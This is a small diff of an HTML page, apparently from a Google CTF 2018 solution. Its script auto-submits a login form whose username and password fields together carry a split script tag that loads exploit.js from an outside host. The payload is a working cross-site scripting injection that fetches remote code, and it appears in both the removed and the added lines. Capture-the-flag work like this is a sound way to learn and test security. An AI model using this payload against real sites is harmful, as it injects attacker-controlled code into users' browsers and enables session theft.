@@ -11,8 +11,8 @@
     <script>
         const form = document.querySelector("form");
         const [user, pass] = form.querySelectorAll("input");
-        user.value = "<script src='https:";
-        pass.value = "blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js'><\/script>";
+        user.value = '<script src="https:';
+        pass.value = 'blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js"><\/script>';
         form.submit();
     </script>
 </body>
